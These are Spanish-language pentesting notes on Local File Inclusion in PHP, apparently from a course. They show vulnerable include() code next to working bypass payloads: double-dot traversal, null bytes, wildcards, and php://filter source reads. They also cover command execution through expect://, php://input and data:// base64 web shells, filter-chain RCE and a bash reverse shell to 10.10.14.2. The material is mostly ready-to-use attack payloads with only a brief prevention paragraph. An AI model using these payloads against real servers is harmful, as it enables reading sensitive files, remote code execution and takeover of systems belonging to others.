# Local File Inclusion (LFI)

Tags: #LFI #OWASP #Explotacion #DirectoryPathTraversal

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

-   **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)


## Métodos de poder hacer un LFI en los diferentes códigos y sanitizaciones.

Con un LFI podemos no solo cargar archivos que agreguemos la ruta de la pagina, si no también cambiar y ver otras rutas en la pagina web.
* **/var/www/html** Ruta de default

Un LFI sin sanitizar
```php
<?php
	$filename = $_GET['filename'];
	include($filename);
?>
```
Para este código sin sanitizar podemos hacer lo siguiente en la **web** y así cargaríamos un archivo:
* **index.php?filename=/etc/passwd**


Con el código sanitizado evitamos lo de arriba.
```php
<?php
	$filename = $_GET['filename'];
	include("/var/www/html/" . $filename); 
?>

	// . = Concatenar
	// ruta = Que busque el archivo siempre en esa ruta
```
Si colocamos lo mismo de  **index.php?filename=/etc/passwd** en la ruta final obtendríamos:
**/var/www/html//etc/passwd** -> Por lo que esa ruta no existe y no nos daría nada. 
Pero podríamos hacer un **Directory Path Traversal** en la **web** de la siguiente manera:
* **index.php?filename=../../../../../etc/passwd** y así burlar la sanitización ya que tendríamos un **/etc/passwd**


Sanitizado de nuevo el código evitaríamos lo de arriba.
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html/" . $filename); 
?>

	// . = Concatenar
	// ruta = Que busque el archivo siempre en esa ruta
	// str_replace = Donde vea ../ lo convierta a nada 
```
Si hacemos de nuevo un Directory Path Traversal de la manera normal obtendríamos lo siguiente:
**/var/www/html/../../../../../etc/passwd** -> /var/www/htmletc/passwd Y esa ruta no existe
Pero podríamos burlar esa sanitización en la **web** colocándolo de manera doble.
* **index.php?filename=....//....//....//....//....//etc/passwd** y como resultado final tendríamos **/etc/passwd**


Sanitizado de nuevo el código con expresiones regulares evitaríamos lo de arriba.
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	
	if(preg_match("/\/etc\/passwd/", $filename) === 1){
		echo "\n[+] No es posible visualizar el contenido de este archivo\n";
	} else {
		include("/var/www/html/" . $filename);
	} 
?>

	// . = Concatenar
	// ruta = Que busque el archivo siempre en esa ruta
	// str_replace = Donde vea ../ lo convierta a nada 
	// preg_match = Lo que haga match que seria /etc/passwd, entraria al bucle y no mostraria el contenido 
```
Para poder burlar este tipo de sanitización podemos colocar este tipo de input **/etc/././././passwd**, **/etc///passwd**, 
Pero podriaos burlar esa sanitizacion en la **web** colocándolo mas barras después del etc o barra y punto.
* **index.php?filename=....//....//....//....//....//etc/////passwd** y obtendríamos como resultado **/etc/passwd**
* **index.php?filename=....//....//....//....//....//etc/./././passwd** y obtendríamos como resultado **/etc/passwd**
También podemos utilizar interrogantes y el sistema nos buscara aun así el archivo:
* **index.php?filename=....//....//....//....//....//e??/./././pa???d** y obtendríamos como resultado **/etc/passwd**


Sanitizando de nuevo el codigo forzando a que busque un archivo .php en la ruta 
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	
	include("/var/www/html/" . $filename . ".php");
?>

	// . = Concatenar
```
Esto funciona para las versiones de **PHP menor a la 5.3.8** y lo que podemos hacer para evitar esa extensión es agregar un **NULL BYTE** en la **web** de la siguiente manera:
Donde **%00 -> \\0** 
* **index.php?filename=....//....//....//....//....//etc/passwd%00** y obtendríamos como resultado **/etc/passwd**
Cuando exista una sanitización por numero de caracteres como los últimos 6 (passwd) o por los últimos 4 (.txt). Podemos hacer lo siguiente:
Podriamos agregar un **/.** al final y así podríamos burlar la sanitización. 
* **index.php?filename=....//....//....//....//....//etc/passwd/.** y obtendríamos como resultado **/etc/passwd**
* **index.php?filename=....//....//....//....//....//tmp/test.txt/.** y obtendríamos como resultado el archivo **test.txt**

----

También podemos emplear **Groupers** en la url de la Web:
Este nos ayuda a apuntar a un recurso **(index.php, secret.php, etc...)** y después mediante una conversión representarlo en base64
* index.php?page=**php://filter/convert.base64-encode/resource=index.php** y obtendríamos como resultado el index.php pero en base64, después colocamos el resultado en un archivo **data**
```bash
❯ cat data | base64 -d | sponge data                             # Sponge = Colocar el output decodificado en el mismo archivo
```

```bash
❯ echo -n "ihst98htar78htrs8697hstrhyu8tr" | base64 -d; echo     # Si la cadena es pequena, podemos mostrar el contenido en la pantalla
```


Otro **Groupers** que podemos usar en la web es el siguiente:
Este nos ayuda a rotar cada carácter en 13 posiciones
* index.php?page=**php://filter/read=string.rot13/resource=secret.php** y obtendríamos como resultado algo raro que es el resultado pero rotado 13 caracteres y pegamos el resultado en un archivo **data**
```bash
❯ cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]' # tr = Nos ayudara a rotar de nuevo las 13 posiciones, empezando por la letra que nos arroje el output (Siempre cambian) 

	# Empezamos por la letra que nos arroje el output
	# Despues completamos para llegar a la z 
	# Terminamos colocando lo que falta del abcedario
	# Lo volvemos a hacer pero ahora en mayuscula
	# La ultima instruccion es para rotar empezando por la p de 'php'
```


Otro **Groupers** que podemos usar en la web es el siguiente: 
Este nos ayudaria convertir de UTF-8 a UTF-16:
* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendríamos como resultado que nos muestre el resultado por la web ya que no lo esta 'interpretando'.


Otro **Groupers** que podemos usar en la web es el siguiente:
Este nos ayudara a ejecutar comandos
* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendríamos como resultado

### En BurpSuite
Este **Groupers** lo podemos usar en BurpSuite:
Nos ayudara a ejecutar comandos
* POST /?filename=**expect://whoami** HTTP/1.1  
Obtendríamos el whoami de la maquina (Si es que esta habilitado)


Este **Groupers** lo podemos usar en BurpSuite:
Nos ayudara a ejecutar comandos
* POST /?filename=**php://input** HTTP/1.1 
Obtendríamos el comando que nosotros le pasemos (whoami, id, etc...)
```php
<?php system("whoami"); ?>              # Esta parte se pone al final de la peticion en BurpSuite
```


Este **Groupers** lo podemos usar en BurpSuite:
Nos ayudara a ejecutar comandos, pasándole un comando que este encodeado en base64
```php
<?php system("whoami"); ?>        # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=
```
* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4= HTTP/1.1 
Obtendríamos el comando que nosotros le pasemos (whoami, id, etc...)


Este **Groupers** lo podemos usar en BurpSuite:
Para controlar el comando que queramos inyectar.
```php
<?php system($_GET["cmd"]); ?>         # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+, debemos de url-encodear el + = %2b
```
* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=whoami HTTP/1.1 
* GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami HTTP/1.1  -> La manera correcta 
Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 


### PHP Filter Chain Generator

Podemos usar el siguiente comando y nos lo hará automáticamente con la tool.

```bash
❯ python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'     # Nos crea la expresion 
```
Esto es en la url de la web.
* localhost?filename='Aquí colocamos el resultado del comando anterior'   
Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.


Para controlar el comando a ejecutar.
```bash
❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'     # Nos crea la expresion, & lo debemos de url-encodear = %26
```
Esto es en la url de la web.
* localhost?filename='Aquí colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
* localhost?filename='Aquí colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"     -> La manera correcta
Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.
Debemos de colocar al final **&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"** y es ahi donde podriamos colocar cualquier comando